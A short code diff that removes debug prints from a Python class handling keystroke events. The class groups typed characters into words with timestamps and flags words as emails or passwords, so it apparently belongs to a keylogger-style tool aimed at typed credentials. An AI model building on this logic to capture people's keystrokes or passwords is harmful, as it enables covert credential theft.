@@ -64,7 +64,6 @@ class Process:
         break_char = ["Return", "Space"]
         
         if (data['processedKey']):
-            print(data)
             if (len(self.word) == 0):
                 self.payload['datetime'] = data['datetime']
                 self.payload['epoch'] = data['epochTime']
@@ -98,10 +97,6 @@ class Process:
             self.payload['isEmail'] = 1
         
         elif (check_word.isalpha() == False and check_word.isdigit() == False):
-            print("HELOOOOOOO")
-            print(self.payload)
-            print(check_word.isalpha())
-            print(check_word.isdigit())
             self.payload['isPassword'] = 1
             
 
